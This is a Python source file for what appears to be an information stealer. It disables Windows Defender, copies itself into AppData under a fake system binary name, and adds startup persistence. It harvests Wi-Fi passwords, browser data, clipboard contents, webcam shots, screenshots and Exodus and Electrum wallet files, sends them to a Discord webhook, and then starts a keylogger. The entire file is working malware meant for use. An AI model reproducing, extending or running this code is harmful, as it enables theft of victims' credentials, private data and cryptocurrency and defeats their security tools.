from modules.browser import run
from modules.browser import delete_files
from modules.info import start
from modules.wifi import WifiPasswords
from modules.keylogger import Keylogger
from modules.startup import Startup
from modules.antidebug import Antidebug
#from tkinter import messagebox
#from threading import Thread
import sys
import os
import zipfile
import subprocess
import discord
from discord import File, SyncWebhook
import socket
import requests
from config import DEFENDER, ERROR, KEYLOGGER, STARTUP, WEBHOOK, ANTIDEBUG, MOVE
#from modules.wallet import wallets


if ANTIDEBUG:
    try: Antidebug
    except: pass

def disable_defender():
    #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
    cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
    try:
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
    except:
        pass
    
if DEFENDER:
    disable_defender()


#def error():
#    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")  
#    
#    
#if ERROR:
#    error_t = Thread(target=error).start()


def copyfile(file, target):
    with open(file, "rb") as f:
        bins = f.read()
        
    with open(target, "wb") as f:
        f.write(bins)


file_dir = sys.argv[0]

#C:\Users\Korisnik\AppData\Roaming\MicrosoftWindows\System

def move():
    try:
        target_dir = f"{os.getenv('appdata')}\MicrosoftWindows\System"
        
        if not os.path.exists(target_dir):
            os.mkdir(f"{os.getenv('appdata')}\MicrosoftWindows")
            os.mkdir(target_dir)
        
        #shutil.copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")

        copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")

        try:
            os.chdir(target_dir)
            subprocess.Popen(f"{target_dir}\SystemBin_64bit.exe", shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
            sys.exit(0)
        except:
            pass
    except:
        return
    
if MOVE and file_dir[:1].upper() + file_dir[1:] != f"{os.getenv('appdata')}\MicrosoftWindows\System\SystemBin_64bit.exe":
    move()


if STARTUP:
    try: Startup(sys.argv[0])
    except: pass


try:
    start() #system info
except:
    pass

try:
    wifi = WifiPasswords()
    wifi.run()
except:
    pass

try:
    run() #browser
except:
    pass


def zip(name, files):
    try:
        with zipfile.ZipFile(name, "w") as zip:
            for file in files:
                try:
                    zip.write(file)
                except:
                    pass
    except:
        pass


def send_sys(url):
    try: webhook = SyncWebhook.from_url(url)
    except: return

    try:
        with open("system.txt", "r") as f: sys_info = f.read()
        with open("wifi.txt", "r") as f: wifi_info = f.read()
        
        if wifi_info == "": wifi_info = "No wifi passwords found!"
        if sys_info == "": sys_info = "Failed to fetch system information!"
        
        embed = discord.Embed(title="System", color=0x10131c, description="")
        embed.add_field(name="System Information", value=f"```{sys_info}```", inline=False)
        embed.add_field(name="Wifi Information", value=f"```{wifi_info}```", inline=False)
        embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
        
        if os.path.exists(os.path.join(os.getcwd(), "clipboard.txt")):
            webhook.send(embed=embed, file=discord.File("clipboard.txt"))
            delete_files(["system.txt", "wifi.txt", "clipboard.txt"])
        else:
            webhook.send(embed=embed)
            delete_files(["system.txt", "wifi.txt"])
    except: pass
    
    if os.path.exists(os.path.join(os.getcwd(), "webcam.png")):
        embed = discord.Embed(title = "Webcam", color=0x10131c, description="")
        embed.set_image(url="attachment://webcam.png")
        embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
        
        webhook.send(embed=embed, file=discord.File("webcam.png"))
        delete_files(["webcam.png"])
    
    if os.path.exists(os.path.join(os.getcwd(), "screenshot.png")):
        embed = discord.Embed(title = "Screenshot", color=0x10131c, description="")
        embed.set_image(url="attachment://screenshot.png")
        embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
        
        webhook.send(embed=embed, file=discord.File("screenshot.png"))
        delete_files(["screenshot.png"])
    
send_sys(WEBHOOK)


#zip("System.zip", ["wifi.txt", "system.txt", "screenshot.png", "webcam.png"])
#delete_files(["wifi.txt", "system.txt"]) #delete_files(["wifi.txt", "system.txt", "screenshot.png"])

zip_files = []

dir = os.getcwd()
for filename in os.listdir(dir):
    if filename.endswith(".zip"):
        with zipfile.ZipFile(os.path.join(dir, filename), "r") as zipfile_:
            if len(zipfile_.namelist()) != 0:
                zip_files.append(filename)
            #if len(zipfile_.namelist()) == 0:
            #    delete_files([os.path.join(dir, filename)])
            #else:
            #    zip_files.append(filename)


def send_browser(url, files_dir):
    try:
        webhook = SyncWebhook.from_url(url)#https://discord.com/api/webhooks/ID/TOKEN
    except:
        return

    try:
        ip = requests.get("https://api.ipify.org").text
    except:
        ip = "Unknown"

    embed = discord.Embed(title="Browser Data", description=f"```Browser Data for: {socket.gethostname()}, {ip}```", color=0x10131c)
    embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
    
    files = []
    
    for file in files_dir:
        try:
            files.append(File(file))
        except:
            pass

    
    try: webhook.send(embed=embed, files=files)
    except: pass
    
    delete_files(["Chrome.zip", "Brave.zip", "Chromium.zip", "Edge.zip", "Opera.zip", "OperaGX.zip"])


try:
    #send(WEBHOOK, ["Chrome.zip", "Brave.zip", "Chromium.zip", "Edge.zip", "Opera.zip", "OperaGX.zip"], "Browser Data")
    send_browser(WEBHOOK, zip_files)
except: pass


def wallets(url):
    webhook = SyncWebhook.from_url(url)
    
    EXODUS_DIR = os.path.join(os.getenv("appdata"), "Exodus", "exodus.wallet")
    ELECTRUM_DIR = os.path.join(os.getenv("appdata"), "Electrum", "wallets")
    
    if os.path.exists(EXODUS_DIR):
        exodus_zip = zipfile.ZipFile("Exodus.zip", "w", zipfile.ZIP_DEFLATED)
        for root, dirs, files in os.walk(EXODUS_DIR):
            for file in files:
                exodus_zip.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), EXODUS_DIR))
        exodus_zip.close()
    
        try:
            with open("Exodus.zip", "rb") as wallet:
                wallet_zip = File(wallet, filename="Exodus.zip")
                webhook.send(file=wallet_zip)
        except:
            embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            webhook.send(embed=embed)
    
        delete_files(["Exodus.zip"])
    
    else:
        embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        webhook.send(embed=embed)
    
    if os.path.exists(ELECTRUM_DIR):
        electrum_zip = zipfile.ZipFile("Electrum.zip", "w", zipfile.ZIP_DEFLATED)
        for root, dirs, files in os.walk(ELECTRUM_DIR):
            for file in files:
                electrum_zip.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), ELECTRUM_DIR))
        electrum_zip.close()
    
        try:
            with open("Electrum.zip", "rb") as wallet:
                wallet_zip = File(wallet, filename="Electrum.zip")
                webhook.send(file=wallet_zip)
        except:
            embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            webhook.send(embed=embed)
    
        delete_files(["Electrum.zip"])
    
    else:
        embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        webhook.send(embed=embed)

try:
    wallets(WEBHOOK)
except: pass


if KEYLOGGER:
    try:
        keyLogger = Keylogger()
        keyLogger.run()
    except:
        pass
